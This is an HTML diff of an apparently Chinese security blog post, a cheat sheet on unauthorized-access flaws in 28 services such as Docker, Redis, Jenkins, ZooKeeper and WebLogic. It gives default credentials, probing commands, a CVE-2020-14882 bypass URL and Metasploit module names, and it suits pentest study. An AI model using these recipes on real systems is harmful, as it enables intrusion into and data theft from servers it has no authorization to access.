@@ -255,49 +255,112 @@
 <hr>
 <p>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途…</p>
 <h3 id="0x01-未授权访问"><a href="#0x01-未授权访问" class="headerlink" title="0x01 未授权访问"></a>0x01 未授权访问</h3><h4 id="1-Active-MQ-未授权访问"><a href="#1-Active-MQ-未授权访问" class="headerlink" title="1. Active MQ 未授权访问"></a>1. Active MQ 未授权访问</h4><p>默认端口：8161<br>默认密码：admin&#x2F;admin<br>服务指纹</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8161/tcp open  http    Jetty httpd 7.6.7.v20120910</span><br><span class="line">|_basic realm=ActiveMQRealm</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">PORT     STATE SERVICE VERSION
+8161&#x2F;tcp open  http    Jetty httpd 7.6.7.v20120910
+|_basic realm&#x3D;ActiveMQRealm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="2-Atlassian-Crowd-未授权访问"><a href="#2-Atlassian-Crowd-未授权访问" class="headerlink" title="2. Atlassian Crowd 未授权访问"></a>2. Atlassian Crowd 未授权访问</h4><p>默认端口：8095<br>漏洞路径：&#x2F;crowd&#x2F;admin&#x2F;uploadplugin.action<br><strong>poc:</strong> <a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p>
 <h4 id="3-CouchDB-未授权访问"><a href="#3-CouchDB-未授权访问" class="headerlink" title="3. CouchDB 未授权访问"></a>3. CouchDB 未授权访问</h4><p>默认端口：5984<br>测试命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl ip:5984</span><br><span class="line">curl ip:5984/_config</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">curl ip:5984
+curl ip:5984&#x2F;_config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="4-Docker-Remote-API未授权访问"><a href="#4-Docker-Remote-API未授权访问" class="headerlink" title="4. Docker Remote API未授权访问"></a>4. Docker Remote API未授权访问</h4><p>默认端口：2375<br>漏洞验证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看版本：http://ip:2375/version</span><br><span class="line"></span><br><span class="line">列出容器信息：http://ip:2375/v1.23/containers/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">查看版本：http:&#x2F;&#x2F;ip:2375&#x2F;version
+
+列出容器信息：http:&#x2F;&#x2F;ip:2375&#x2F;v1.23&#x2F;containers&#x2F;json
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>漏洞复现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 列出所有镜像</span><br><span class="line"></span><br><span class="line">docker  -H tcp://*.*.*.*:2375 images</span><br><span class="line"></span><br><span class="line">2）列出所有容器</span><br><span class="line"></span><br><span class="line">docker  -H tcp://*.*.*.*:2375 ps -a</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1) 列出所有镜像
+
+docker  -H tcp:&#x2F;&#x2F;*.*.*.*:2375 images
+
+2）列出所有容器
+
+docker  -H tcp:&#x2F;&#x2F;*.*.*.*:2375 ps -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="5-Dubbo-未授权访问"><a href="#5-Dubbo-未授权访问" class="headerlink" title="5. Dubbo 未授权访问"></a>5. Dubbo 未授权访问</h4><p>默认端口：20880<br>漏洞验证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telent IP port</span><br><span class="line">nc IP PORT</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">telent IP port
+nc IP PORT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="6-Druid-未授权访问"><a href="#6-Druid-未授权访问" class="headerlink" title="6. Druid 未授权访问"></a>6. Druid 未授权访问</h4><p>漏洞检测</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">直接在网站的url中后加上以下路径，如无需登录，可登录到Druid监控界面，则漏洞存在</span><br><span class="line"></span><br><span class="line">/druid/index.html</span><br><span class="line">/druid/websession.html</span><br><span class="line">/druid/datasource.html</span><br><span class="line">/druid/sql.html</span><br><span class="line">/druid/spring.html</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">直接在网站的url中后加上以下路径，如无需登录，可登录到Druid监控界面，则漏洞存在
+
+&#x2F;druid&#x2F;index.html
+&#x2F;druid&#x2F;websession.html
+&#x2F;druid&#x2F;datasource.html
+&#x2F;druid&#x2F;sql.html
+&#x2F;druid&#x2F;spring.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="7-Elasticsearch-未授权访问"><a href="#7-Elasticsearch-未授权访问" class="headerlink" title="7. Elasticsearch 未授权访问"></a>7. Elasticsearch 未授权访问</h4><p>默认端口：9200&#x2F;9300<br>漏洞测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://host:9200/_cat/indices</span><br><span class="line">http://host:9200/_river/_search #查看数据库敏感信息</span><br><span class="line">http://lhost:9200/_nodes #查看节点数据</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;host:9200&#x2F;_cat&#x2F;indices
+http:&#x2F;&#x2F;host:9200&#x2F;_river&#x2F;_search #查看数据库敏感信息
+http:&#x2F;&#x2F;lhost:9200&#x2F;_nodes #查看节点数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="8-FTP-未授权匿名访问"><a href="#8-FTP-未授权匿名访问" class="headerlink" title="8. FTP 未授权匿名访问"></a>8. FTP 未授权匿名访问</h4><p>漏洞验证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">访问ftp路径：ftp://ip:port/</span><br><span class="line"></span><br><span class="line">匿名登录：</span><br><span class="line">  a. ftp的密码为空</span><br><span class="line">  b. anonymous的密码为空或者guest</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">访问ftp路径：ftp:&#x2F;&#x2F;ip:port&#x2F;
+
+匿名登录：
+  a. ftp的密码为空
+  b. anonymous的密码为空或者guest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="9-Hadoop-Yarn-REST-API未授权漏洞"><a href="#9-Hadoop-Yarn-REST-API未授权漏洞" class="headerlink" title="9. Hadoop Yarn REST API未授权漏洞"></a>9. Hadoop Yarn REST API未授权漏洞</h4><p>默认端口：8088(WebUI)、50070、50075<br>漏洞验证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1) 未授权访问，可看到Hadoop YARN ResourceManager WebUI页面</span><br><span class="line">http://ip:8088/</span><br><span class="line">http://ip:8088/cluster</span><br><span class="line"></span><br><span class="line">2) 验证指令: 返回application-id可能存在漏洞</span><br><span class="line">curl -v -X POST &#x27;http://ip:8088/ws/v1/cluster/apps/new-application&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1) 未授权访问，可看到Hadoop YARN ResourceManager WebUI页面
+http:&#x2F;&#x2F;ip:8088&#x2F;
+http:&#x2F;&#x2F;ip:8088&#x2F;cluster
+
+2) 验证指令: 返回application-id可能存在漏洞
+curl -v -X POST &#39;http:&#x2F;&#x2F;ip:8088&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="10-JBoss-未授权访问"><a href="#10-JBoss-未授权访问" class="headerlink" title="10. JBoss 未授权访问"></a>10. JBoss 未授权访问</h4><p><strong>漏洞介绍</strong><br>JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问<code>http://ip:8080/jmx-console</code> 就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马<br><strong>漏洞检测</strong><br>访问 <code>http://ip:port/</code> 看是否能进入 jmx-console 和 web-console 页面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8080/jmx-console/</span><br><span class="line">http://ip:8080/jbossws/</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:8080&#x2F;jmx-console&#x2F;
+http:&#x2F;&#x2F;ip:8080&#x2F;jbossws&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="11-Jenkins-未授权访问"><a href="#11-Jenkins-未授权访问" class="headerlink" title="11. Jenkins 未授权访问"></a>11. Jenkins 未授权访问</h4><p><strong>漏洞简介</strong><br>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进行脚本执行界面从而获取服务器权限<br><strong>漏洞检测</strong><br>通过url输入以下地址，若能访问，证明存在未授权访问漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;target&gt;:8080/manage</span><br><span class="line">http://&lt;target&gt;:8080/script</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;target&gt;:8080&#x2F;manage
+http:&#x2F;&#x2F;&lt;target&gt;:8080&#x2F;script<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="12-Jupyter-Notebook-未授权访问"><a href="#12-Jupyter-Notebook-未授权访问" class="headerlink" title="12. Jupyter Notebook 未授权访问"></a>12. Jupyter Notebook 未授权访问</h4><p><strong>漏洞介绍</strong><br>当管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 访问http://your-ip:8888将看到Jupyter Notebook的Web管理界面，没有要求填写密码</span><br><span class="line"></span><br><span class="line">2. 选择 new -&gt; terminal 即可创建一个控制台，执行任意指令</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1. 访问http:&#x2F;&#x2F;your-ip:8888将看到Jupyter Notebook的Web管理界面，没有要求填写密码
+
+2. 选择 new -&gt; terminal 即可创建一个控制台，执行任意指令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="13-Kibana-未授权访问"><a href="#13-Kibana-未授权访问" class="headerlink" title="13. Kibana 未授权访问"></a>13. Kibana 未授权访问</h4><p><strong>漏洞简介</strong><br>Kibana暴露在外网，没有做安全的登录认证，会被外部随意访问查看所有的数据，造成少数据泄露<br><strong>漏洞检测</strong><br>直接访问kibana的页面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ip:5601/</span><br><span class="line">https://ip/app/kibana#</span><br><span class="line">http://ip:5601/app/kibana#/</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:5601&#x2F;
+https:&#x2F;&#x2F;ip&#x2F;app&#x2F;kibana#
+http:&#x2F;&#x2F;ip:5601&#x2F;app&#x2F;kibana#&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="14-Kubernetes-API-Server-未授权"><a href="#14-Kubernetes-API-Server-未授权" class="headerlink" title="14. Kubernetes API Server 未授权"></a>14. Kubernetes API Server 未授权</h4><p><strong>漏洞简介</strong><br>Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，8080可以直接通过 Web 访问，6443可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，攻击者就可以通过这两个接口去获取容器的权限<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口：8080，api dashboard：http://ip:8080/ui</span><br><span class="line"></span><br><span class="line">端口：10250，kubelet API的HTTPS端口，通过路径/pods获取环境变量、运行的容器信息、命名空间等信息：https://ip:10250/ui</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">端口：8080，api dashboard：http:&#x2F;&#x2F;ip:8080&#x2F;ui
+
+端口：10250，kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息：https:&#x2F;&#x2F;ip:10250&#x2F;ui<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="15-LDAP-未授权访问"><a href="#15-LDAP-未授权访问" class="headerlink" title="15. LDAP 未授权访问"></a>15. LDAP 未授权访问</h4><p>默认端口：389<br>使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser直接连接，获取目录内容</p>
 <h4 id="16-MongoDB-未授权访问"><a href="#16-MongoDB-未授权访问" class="headerlink" title="16. MongoDB 未授权访问"></a>16. MongoDB 未授权访问</h4><p><strong>漏洞简介</strong><br>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。<br>造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth （默认空口令）<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --host ip --port 27017</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">mongo --host ip --port 27017<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="17-Memcached-未授权访问"><a href="#17-Memcached-未授权访问" class="headerlink" title="17. Memcached 未授权访问"></a>17. Memcached 未授权访问</h4><p><strong>漏洞简介</strong><br>Memcached 端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露<br><strong>漏洞检测</strong><br>无需用户名密码，直接连接memcache 服务的11211端口，连接后使用 stats 命令来输出 Memcached 服务信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet ip 11211 或 nc -vv ip 11211</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">telnet ip 11211 或 nc -vv ip 11211<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="18-NFS-未授权访问"><a href="#18-NFS-未授权访问" class="headerlink" title="18. NFS 未授权访问"></a>18. NFS 未授权访问</h4><p><strong>漏洞简介</strong><br>服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏<br><strong>默认端口</strong>：2049&#x2F;20048<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看nfs服务器上的共享目录</span><br><span class="line">showmount -e ip </span><br><span class="line"></span><br><span class="line">#挂载相应共享目录到本地</span><br><span class="line">mount -t nfs ip:/grdata /mnt </span><br><span class="line"></span><br><span class="line">#卸载目录</span><br><span class="line">umount /mnt</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#查看nfs服务器上的共享目录
+showmount -e ip 
+
+#挂载相应共享目录到本地
+mount -t nfs ip:&#x2F;grdata &#x2F;mnt 
+
+#卸载目录
+umount &#x2F;mnt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="19-Rsync-未授权访问"><a href="#19-Rsync-未授权访问" class="headerlink" title="19. Rsync 未授权访问"></a>19. Rsync 未授权访问</h4><p><strong>漏洞简介</strong><br>Rsync默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件；rsync未授权访问危害主要有两个：一是造成了严重的信息泄露；二是上传脚本后门文件，远程命令执行<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1) 列出目标服务器的同步目录</span><br><span class="line">rsync ip::</span><br><span class="line">rsync rsync://ip:873</span><br><span class="line"></span><br><span class="line">2) 查看模块文件</span><br><span class="line"></span><br><span class="line">rsync rsync://ip:873/moudle</span><br><span class="line"></span><br><span class="line">3) 下载上传文件</span><br><span class="line">下载：rsync -av ip::src/路径 文件路径</span><br><span class="line">上传：rsync -av 文件路径 rsync://ip:873/目标系统文件路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1) 列出目标服务器的同步目录
+rsync ip::
+rsync rsync:&#x2F;&#x2F;ip:873
+
+2) 查看模块文件
+
+rsync rsync:&#x2F;&#x2F;ip:873&#x2F;moudle
+
+3) 下载上传文件
+下载：rsync -av ip::src&#x2F;路径 文件路径
+上传：rsync -av 文件路径 rsync:&#x2F;&#x2F;ip:873&#x2F;目标系统文件路径
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="20-Redis-未授权访问"><a href="#20-Redis-未授权访问" class="headerlink" title="20. Redis 未授权访问"></a>20. Redis 未授权访问</h4><p><strong>漏洞简介</strong><br>redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器<br>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) 使用redis-cli命令直接远程免密登录redis主机</span><br><span class="line"></span><br><span class="line">redis-cli -h 目标主机IP</span><br><span class="line"></span><br><span class="line">2) 连接后执行命令ping，如返回响应PONG，则存在漏洞</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1) 使用redis-cli命令直接远程免密登录redis主机
+
+redis-cli -h 目标主机IP
+
+2) 连接后执行命令ping，如返回响应PONG，则存在漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="21-RabbitMQ-未授权访问"><a href="#21-RabbitMQ-未授权访问" class="headerlink" title="21. RabbitMQ 未授权访问"></a>21. RabbitMQ 未授权访问</h4><p><strong>漏洞检测</strong><br>默认账号密码为guest</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ip:15672</span><br><span class="line">http://ip:25672/</span><br><span class="line">http://ip:15692/</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:15672
+http:&#x2F;&#x2F;ip:25672&#x2F;
+http:&#x2F;&#x2F;ip:15692&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="22-Solr-未授权访问"><a href="#22-Solr-未授权访问" class="headerlink" title="22. Solr 未授权访问"></a>22. Solr 未授权访问</h4><p><strong>漏洞简介</strong><br>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。<br>solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell<br><strong>漏洞检测</strong><br>敏感目录扫描时加上 &#x2F;solr&#x2F;admin</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.com/solr/admin</span><br><span class="line">https://xx.xx.com/solr/admin</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xx.xx.com&#x2F;solr&#x2F;admin
+https:&#x2F;&#x2F;xx.xx.com&#x2F;solr&#x2F;admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="23-SpringBoot-Actuator-未授权访问"><a href="#23-SpringBoot-Actuator-未授权访问" class="headerlink" title="23. SpringBoot Actuator 未授权访问"></a>23. SpringBoot Actuator 未授权访问</h4><p><strong>漏洞简介</strong><br>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。<br>在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至接管服务器<br><strong>漏洞检测</strong><br>访问敏感路径: <code>http://ip/path</code></p>
 <table>
 <thead>
@@ -374,15 +437,37 @@
 </tr>
 </tbody></table>
 <h4 id="24-Spark-未授权访问"><a href="#24-Spark-未授权访问" class="headerlink" title="24. Spark 未授权访问"></a>24. Spark 未授权访问</h4><p><strong>漏洞简介</strong><br>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1) nmap探测</span><br><span class="line"></span><br><span class="line">6066/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line">8081/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line">8082/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line"></span><br><span class="line">2) msf利用</span><br><span class="line"></span><br><span class="line">msf5&gt;use exploit/linux/http/spark_unauth_rce</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1) nmap探测
+
+6066&#x2F;tcp  open  http           Jetty 9.3.z-SNAPSHOT
+8081&#x2F;tcp  open  http           Jetty 9.3.z-SNAPSHOT
+8082&#x2F;tcp  open  http           Jetty 9.3.z-SNAPSHOT
+
+2) msf利用
+
+msf5&gt;use exploit&#x2F;linux&#x2F;http&#x2F;spark_unauth_rce
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="25-VNC-未授权访问"><a href="#25-VNC-未授权访问" class="headerlink" title="25. VNC 未授权访问"></a>25. VNC 未授权访问</h4><p><strong>漏洞简介</strong><br>VNC 是虚拟网络控制台Virtual Network Console的英文缩写，是一款优秀的远程控制工具软件。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) msf检测</span><br><span class="line"></span><br><span class="line">auxiliary/scanner/vnc/vnx_none_auth</span><br><span class="line"></span><br><span class="line">2）vncviewer命令连接主机</span><br><span class="line"></span><br><span class="line">vncviewer ip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1) msf检测
+
+auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnx_none_auth
+
+2）vncviewer命令连接主机
+
+vncviewer ip
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="26-Weblogic-未授权访问"><a href="#26-Weblogic-未授权访问" class="headerlink" title="26. Weblogic 未授权访问"></a>26. Weblogic 未授权访问</h4><p><strong>漏洞简介</strong><br>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令<br><strong>漏洞检测</strong><br>访问 <code>http://ip:7001/console</code> 即可查看到后台登录页面<br>weblogic权限绕过（CVE-2020-14882）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造特殊请求的URL，即可未授权访问到管理后台页面</span><br><span class="line"></span><br><span class="line">http://ip:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">构造特殊请求的URL，即可未授权访问到管理后台页面
+
+http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="27-ZooKeeper-未授权访问"><a href="#27-ZooKeeper-未授权访问" class="headerlink" title="27. ZooKeeper 未授权访问"></a>27. ZooKeeper 未授权访问</h4><p><strong>漏洞简介</strong><br>ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务<br><strong>漏洞检测</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo envi | nc ip port          #获取服务器环境信息</span><br><span class="line">echo stat | nc ip port          #获取性能和连接的客户端的统计信息</span><br><span class="line">echo ruok | nc ip port          #测试服务器是否运行在非错误状态</span><br><span class="line">echo reqs | nc ip port          #列出未完成请求</span><br><span class="line">echo dump | nc ip port          #列出未完成的会话和临时节点</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">echo envi | nc ip port          #获取服务器环境信息
+echo stat | nc ip port          #获取性能和连接的客户端的统计信息
+echo ruok | nc ip port          #测试服务器是否运行在非错误状态
+echo reqs | nc ip port          #列出未完成请求
+echo dump | nc ip port          #列出未完成的会话和临时节点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="28-Zabbix-未授权访问"><a href="#28-Zabbix-未授权访问" class="headerlink" title="28. Zabbix 未授权访问"></a>28. Zabbix 未授权访问</h4><p><strong>漏洞简介</strong><br>zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果<br><strong>漏洞检测</strong><br>无需账户密码直接访问zabbix页面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/zabbix.php</span><br></pre></td></tr></table></figure>
